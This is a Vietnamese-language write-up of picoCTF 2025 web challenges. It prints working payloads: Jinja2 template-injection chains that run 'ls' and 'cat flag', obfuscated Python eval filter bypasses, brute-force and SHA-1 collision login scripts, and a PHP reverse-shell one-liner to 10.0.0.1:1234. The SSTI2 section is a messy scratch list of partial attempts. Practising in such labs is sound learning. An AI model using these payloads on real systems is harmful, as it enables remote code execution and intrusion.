---
title: PICO CTF 2025
date: 2025-06-28
draft: false
description: "for funnn"
tags: ["web", "PICO"]
---

# PICO CTF 2025

![image](https://hackmd.io/_uploads/r1HxiMY1lg.png)

# MỤC LỤC

[Cookie Monster Secret Recipe ✔](#Cookie-Monster-Secret-Recipe)
[head-dump ✔](#head-dump)
[SSTI1 ✔](#SSTI1-->-SSTI-JINJA2)
[n0s4n1ty ✔](#n0s4n1ty-1)
[3v@l ✔](#3v@l)
[SSTI2 ✔](#SSTI2)
[Pachinko ✔](#Pachinko)
[Apriti sesamo ✔](#Apriti-sesamo)
[WebSockFish ✔](#WebSockFish)
[secure-email-service ✖](#secure-email-service)
[Pachinko Revisited ✖](#Pachinko-Revisited)

## Cookie Monster Secret Recipe

-> Chưa có ý tưởng gì để lấy cookie : có thể là XSS
**Scan Directory**
![image](https://hackmd.io/_uploads/S1WfZVjjye.png)
Không có gì đặc biệt
Thử command js trong console xem
![image](https://hackmd.io/_uploads/SyqqbEoiJg.png)
Khả năng là bị base64
![image](https://hackmd.io/_uploads/S1Li-4iskx.png)

## head-dump

Vẫn là scan directorry như bình thường -> không có gì đặc biệt
ngôn ngữ dùng là `js`
đây là bài về API Vậy nên việc của mình là cần để ý đến API
Vào source để xem thì mình thấy 1 API khả nghi trong số các API đến các ảnh hay là file css
![image](https://hackmd.io/_uploads/rkyd0DRiJl.png)
ĐI VÀO API NÀY
![image](https://hackmd.io/_uploads/rkm3RwCskx.png)
Ssau khi vào nó sẽ tải cho mình 1 file `.heapsnapshort`
![image](https://hackmd.io/_uploads/HyR-1ORjyl.png)
Tìm hiểu về file này chút
:::info
`.heapsnapshort` là file lưu trữ trạng thái của bộ nhớ trong ngôn ngữ js
:::
Chuyển nó về PDF -> tìm được `FLAG ` trong file
`picoCTF{Pat!3nt_15_Th3_K3y_f1179e46}`

## SSTI1 -> SSTI JINJA2

1 vài thử hay ho
`{{7*'7'}}` -> `77777`
`{{7*7}}` -> `49`
chưa thêm được gì nữa
có thể của `php`
auke sau khi thi MCTF
dùng bảng check để kiểm tra phía server dùng loại template engine nào và sau đây là follow của mình :
`{{"<h1>Django OR Jinja2</h1>"|striptags }} ` -> `Django OR Jinja2`
Vậy có thế là Django hoặc Jinja2 . Tiếp tục check
`Djan{{ Jinja2.Django }}go` -> LỖI TEMPLATE
vậy có thể kết luận đó là Jinja2
[PAYLOAD](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html?highlight=jinja2%20ssti#jinja-injection-without-class-object)
Dùng **Jinja Injection without <class 'object'>**
Đầu tiên mình check với `ls` trước

```
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
```

![image](https://hackmd.io/_uploads/r1ek7fgnyl.png)
cat thôi

```
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cat flag").read() }}
```

FLAG: `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}`

## n0s4n1ty 1

Có thể đoán là fileupload
![image](https://hackmd.io/_uploads/Bk8Vvq2jkl.png)
techweb : php
![image](https://hackmd.io/_uploads/ry_Nncnikx.png)

up webshell lên và RCE nhưng không thấy `FLAG`
![image](https://hackmd.io/_uploads/SJpLT5hikg.png)
Hết ý tưởng ròi
![image](https://hackmd.io/_uploads/SkGI-hMhye.png)
Chắc chắn là FLAG không nằm trong root hiện tại ; có thể leo thang đặc quyền ngang
:::danger
NUNU
ls cần sudo
![image](https://hackmd.io/_uploads/r1dr2uLh1e.png)
![image](https://hackmd.io/_uploads/Hy4U2dL2kg.png)
picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}
:::

## 3v@l

Dùng hàm `eval` của thư viện `flask`
tuy nhiên chặn kí tự `os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind`
và reg `r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'`
Giờ phải bypass nó
![image](https://hackmd.io/_uploads/SkNxnG6sJx.png)
Cấm hết những kí tự trên này do `REG`
Có thể base64 vẫn ok
`"__import__('os').system('ls')"`
BASE64 -> `Il9faW1wb3J0X18oJ29zJykuc3lzdGVtKCdscycpIg==`
![image](https://hackmd.io/_uploads/ry_nHmpj1x.png)

```
__import__('{}.__sizeof__.__name__[{}.update.__name__.__len__()]+{}.items.__name__[{}.keys.__name__.__len__()]').system('{}.__delattr__.__name__[{}.keys.__name__.__len__()]+{}.items.__name__[{}.keys.__name__.__len__()]')
{}.__delattr__.__name__[{}.keys.__name__.__len__()]+{}.items.__name__[{}.keys.__name__.__len__()] => ls
{}.__sizeof__.__name__[{}.update.__name__.__len__()]+{}.items.__name__[{}.keys.__name__.__len__()] => os

```

:::danger
Sau đây là sửa bài

```python=
__import__('o'+'s').popen('l'+'s').read()
↓
Result: app.py static templates

__import__('o'+'s').popen('l'+'s '+'.'+'.').read()
↓
Result: app bin boot challenge dev etc flag.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var

__import__('o'+'s').popen('ca'+'t '+'.'+'.'+chr(47)+'flag'+'.'+'txt').read()
↓
Result: picoCTF{D0nt_Use_Unsecure_f@nctionscaec21d1}
=> 1 cách nữa để tương tác với eval
```

:::

## SSTI2

`{{7*7}}` -> `49`
Thử thì cũng có vẻ giống nhưng nó sanitize 1 số thành phần ở đây trước hết là `.__` và cả `{%` và `{{`

Mình định làm cách này
in ra các đối tượng có sẵn trong python3
![image](https://hackmd.io/_uploads/S114RyWnkl.png)
Sau đó lợi dụng các length làm index
Dùng Name gắn với index được lấy từ length để lấy ra kí tự mình cần
![image](https://hackmd.io/_uploads/ry3OTuxhye.png)
Tuy nhiên nó sanitize rồi . Tìm cách khác thoi
![image](https://hackmd.io/_uploads/rJVPp_e2kx.png)
Thử cách khác

```
{{'<script>alert(origin);</script>'|safe}}
```

![image](https://hackmd.io/_uploads/H1b40_xhJl.png)
Hừm làm được gì nhỉ .... -> php rever shell ???

```
{{'<script>alert(origin);</script>'|safe}}
<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-Ldata-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> attr((request['args']usc*2,request.args.class,request.args.usc*2)|join) </div>
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cat flag").read() }}
attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)
<class 'object'>
{{'<script>php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");';</script>'|safe}}
<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-Ldata-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() </div>
{{ config['\x5f\x5fclass\x5f\x5f'].from_envvar.__globals__.__builtins__.__import__("os").popen("cat flag").read() }}
attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)
<class 'object'>
{{g['\x5f\x5fclass\x5f\x5f']}}  ->  {{g.__class__}}
.__class__
['\x5f\x5fclass\x5f
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config['\x5f\x5fclass\x5f\x5f']['from_envvar']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']("os").popen("ls").read() }}
<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='id' data-12='read' data-13=']() == ' data-14='chiv'> a </div>
<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='x5f\x5f']['globalsx5f\x5f'][' data-5='builtinsx5f\x5f'][' data-6='importx5f\x5f'][' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='ls' data-12='read' data-13=']() == ' data-14='chiv'> \x5f </div>
<div data-gb-custom-block data-tag="if" data-0='application' data-1='][' data-2='][' data-3='__globals__' data-4='][' data-5='__builtins__' data-6='__import__' data-7='](' data-8='os' data-9='popen' data-10='](' data-11='ls' data-12='read' data-13=']() == ' data-14='chiv'> a </div>

 \x5f
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Giờ nó gặp kí tự `_` đều loại bỏ

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

Payload gốc là như này

```
request.application.__globals__['__builtins__']['__import__']('os').popen('cat flag').read()
```

thay `|attr` bằng dầu `.`
thay `__` bằng `('\x5f\x5f`

[Tài liệu](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

## Pachinko

:::danger
CHỮA BÀI NÀO
Đọc code thì thấy có hai cách để ta đi đến FLAG
Cách 1 : theo con đường Admin
![image](https://hackmd.io/_uploads/By6DfhP2kx.png)
cách này thì hơi khó bởi ta chưa biết flag của cái nào cả
Khả năng phải giải xong chall này mới đi được cách này
Cách 2 : Theo con đường use
![image](https://hackmd.io/_uploads/rJK5M2P3kl.png)
ở cách này thì ta thấy nó check 3 giá trị 2 input và 1 output
sau đó nó lại tạo ra 4 giá trị random và 4 giá trị rev tương ứng ròi đến hàm `serializeCiruit`
![image](https://hackmd.io/_uploads/SJhW4hv3ke.png)
Nó làm cài j đấy ...
![image](https://hackmd.io/_uploads/B1s8Vnv3kx.png)
Có vẻ như nó đang trả về địa chỉ bộ nhớ
-> làm sao để mình biết đúng được địa chỉ bộ nhớ đây
1 cách duy nhất là bruitfort thoi
PAYLOAD:

```python=
import requests
import sys

burp0_url = "http://activist-birds.picoctf.net:49784/check"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": "http://activist-birds.picoctf.net:49784",
    "Referer": "http://activist-birds.picoctf.net:49784/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}

for input1 in range(1, 11):
    for input2 in range(1, 11):
        for output in range(1, 11):
            payload = {"circuit": [{"input1": input1, "input2": input2, "output": output}]}
            response = requests.post(burp0_url, headers=burp0_headers, json=payload)
            # Check if the response contains the flag
            if "pico" in response.text:
                print(response.text)
                sys.exit()
            print(f"Sent: input1={input1}, input2={input2}, output={output} | Status: {response.status_code}")
```

Ta sẽ thấy được kết quả như sau
![image](https://hackmd.io/_uploads/rJ1342w2yx.png)
`picoCTF{p4ch1nk0_f146_0n3_e947b9d7}`
:::

## Apriti sesamo

:::danger
dựa vào gợi ý thì mình thấy người dùng đang dang emacs
-> Như vậy sẽ có 1 file back up có đuôi api là `~`
![image](https://hackmd.io/_uploads/SkahGH9hkg.png)
AUKE SAU KHI chuyển từ hex về character sau đó decode base64 thì ta được file này
![image](https://hackmd.io/_uploads/HymGQrcnJe.png)

```php==
<?php
if (isset($_POST["username"]) && isset($_POST["pwd"])) {
    $username = $_POST["username"];
    $password = $_POST["pwd"];
    if ($username == $password) {
        echo "<br/>Failed! No flag for you";
    } else {
        if (sha1($username) === sha1($password)) {
            echo file_get_contents("../flag.txt");
        } else {
            echo "<br/>Failed! No flag for you";
        }
    }
}
```

ĐỌC thì mình thấy đây là sha1 collision
[document](https://exploit-notes.hdks.org/exploit/cryptography/algorithm/sha1-hash-collision-attack/)
sau đó mình sẽ host hai file lên đến lấy nội dung về
![image](https://hackmd.io/_uploads/r1ghQS9hyl.png)
sau đó ta có payload như sau

```python===
import requests
import hashlib
contentA = requests.get(f'http://localhost:8000/messageA')
contentB = requests.get(f'http://localhost:8000/messageB')

burp0_url = "http://verbal-sleep.picoctf.net:56577/impossibleLogin.php"
burp0_headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://verbal-sleep.picoctf.net:56577",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://verbal-sleep.picoctf.net:56577/impossibleLogin.php",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "close"
}
burp0_data = {"username": contentA.content, "pwd": contentB.content}

response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(response.text)
```

AND result is :
![image](https://hackmd.io/_uploads/S1cWVH5nyg.png)
`picoCTF{w3Ll_d3sErV3d_Ch4mp_7d3c7e1c}`
:::

## WebSockFish

:::danger
Kiến thức này khá mới về **websocket**
Mình chưa biết cách nó tương tác với server kiểu gì
![image](https://hackmd.io/_uploads/SJ1ryK1a1g.png)
Giờ hãy xem nó giao tiếp như nào
![image](https://hackmd.io/_uploads/HyZeeK16kg.png)
-> Và cứ như thế server luôn thắng . Vậy làm thế nào để server nghĩ nó thua
Vậy phải làm như nào để tương tác với websocket này
Ta sẽ tạo ra 1 ws khác và khiến cho server nghĩ rằng nó losing

```con=
var ws_address = "ws://" + location.hostname + ":" + location.port + "/ws/";
let ws2 = new WebSocket(ws_address);

ws2.send("eval -1") // works, lets carry on
ws2.send("eval -1337")
ws2.send("eval -13337")
ws2.send("eval -133337")
```

![image](https://hackmd.io/_uploads/SkmEWKypkl.png)
![image](https://hackmd.io/_uploads/rJz5ZKy6ye.png)
Giờ mình sẽ gửi cho server giá trị âm
![image](https://hackmd.io/_uploads/H16R-Y1pyx.png)
**FLAG**: `picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_0d3d41e1}`
:::

##
